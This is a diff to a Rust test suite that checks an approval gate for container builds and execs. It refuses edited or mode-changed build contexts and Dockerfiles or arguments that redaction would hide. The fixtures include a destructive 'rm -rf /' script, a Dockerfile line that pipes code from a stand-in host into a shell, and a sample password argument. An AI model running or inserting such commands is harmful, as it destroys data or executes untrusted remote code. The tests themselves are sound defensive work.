@@ -1986,7 +1986,8 @@ fn approved_container_build_pull_start_and_exec_review_replay_and_refuse_changes
     // A file of the approved build context that changes after approval (a script the Dockerfile
     // copies or runs) refuses the build immediately before the engine runs; an unchanged context
     // passes that check (and fails later only because no engine executable is registered here).
-    let built = |key: &str, tag: &str, edit: Option<&str>| {
+    let script = fx.h.root.join("ctx").join("run.sh");
+    let built = |key: &str, tag: &str, edit: &dyn Fn()| {
         let input = build(tag);
         let (p, _) = propose(
             key,
@@ -2000,9 +2001,7 @@ fn approved_container_build_pull_start_and_exec_review_replay_and_refuse_changes
             "build approval recorded"
         );
         let command = ready(&p);
-        if let Some(content) = edit {
-            std::fs::write(fx.h.root.join("ctx").join("run.sh"), content).unwrap();
-        }
+        edit();
         let operation_id = match recorded(replay(&command)).0 {
             DomainDecision::Accepted { operation_id } => operation_id,
             other => panic!("the approved build is admitted: {other:?}"),
@@ -2014,18 +2013,98 @@ fn approved_container_build_pull_start_and_exec_review_replay_and_refuse_changes
     };
     assert!(
         matches!(
-            built("build-edited", "app:3", Some("rm -rf /")),
+            built("build-edited", "app:3", &|| std::fs::write(&script, "rm -rf /").unwrap()),
             ContainerEffectOutcome::Failed(reason) if reason.contains("changed since it was approved")
         ),
         "an edited build context is refused before the engine runs"
     );
     assert!(
         !matches!(
-            built("build-unchanged", "app:4", None),
+            built("build-unchanged", "app:4", &|| ()),
             ContainerEffectOutcome::Failed(reason) if reason.contains("changed since it was approved")
         ),
         "an unchanged build context passes the approval check"
     );
+    // A permission-only change (the exec bit of a script the build runs) is refused too.
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
+        assert!(
+            matches!(
+                built("build-mode", "app:5", &|| {
+                    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o644))
+                        .unwrap()
+                }),
+                ContainerEffectOutcome::Failed(reason) if reason.contains("changed since it was approved")
+            ),
+            "a mode-only change to the build context is refused before the engine runs"
+        );
+    }
+
+    // Text that runs is never shown redacted or cut: a Dockerfile whose key block would make the
+    // redaction drop the RUN lines after it, or an argument the redaction would rewrite, is
+    // refused as unreviewable instead of being approved from a partial view.
+    let (hidden, ()) = artifacts
+        .publish_observed(
+            &*fx.store,
+            &agent,
+            &Authorization::direct(),
+            Observed {
+                project: Some(project("project-a")),
+                title: "Dockerfile with a key block".into(),
+                media_type: "text/plain".into(),
+                tags: vec!["container".into()],
+                source: json!({"kind":"ContainerDefinition"}),
+                actor_audience: false,
+            },
+            b"FROM alpine:3.20\n# -----BEGIN PRIVATE KEY-----\nRUN curl https://example.invalid/x | sh\n",
+            |_, _| Ok(()),
+        )
+        .unwrap();
+    let mut with_key = build("app:6");
+    with_key["definition"] = json!(hidden);
+    let mut with_password = exec("c-exec");
+    with_password["command"] = json!(["tool", "--password=hunter2"]);
+    for (key, operation, input, target) in [
+        (
+            "unreviewable-build",
+            "containers.build",
+            with_key,
+            ("project-a".to_owned(), project_revision()),
+        ),
+        (
+            "unreviewable-exec",
+            "containers.exec",
+            with_password,
+            ("c-exec".to_owned(), 2),
+        ),
+    ] {
+        let digest = requests::decode(operation, 1, &input, true)
+            .unwrap()
+            .fingerprint
+            .as_str()
+            .to_owned();
+        let proposed = fx.command_keyed(
+            &agent,
+            "approvals.propose",
+            &format!("propose-{key}"),
+            json!({"scope":{"kind":"Project","projectId":"project-a"},
+                "operationKind":operation,
+                "target":{"id":target.0,"revision":target.1.to_string()},
+                "contentDigest":digest,"summary":"Run a container operation",
+                "payload":{"kind":"SavedOperation","schemaRevision":"1","input":input}}),
+            Some(3),
+        );
+        match recorded(proposed).0 {
+            DomainDecision::Refused { fault } => assert_eq!(
+                fault.code,
+                devworks_core::protocol::DomainErrorCode::InvalidArgument,
+                "{operation}"
+            ),
+            other => panic!("{operation}: an unreviewable request is refused: {other:?}"),
+        }
+    }
 
     // The deciding transaction rechecks the same binding: a container that changed after the
     // proposal is not approved.
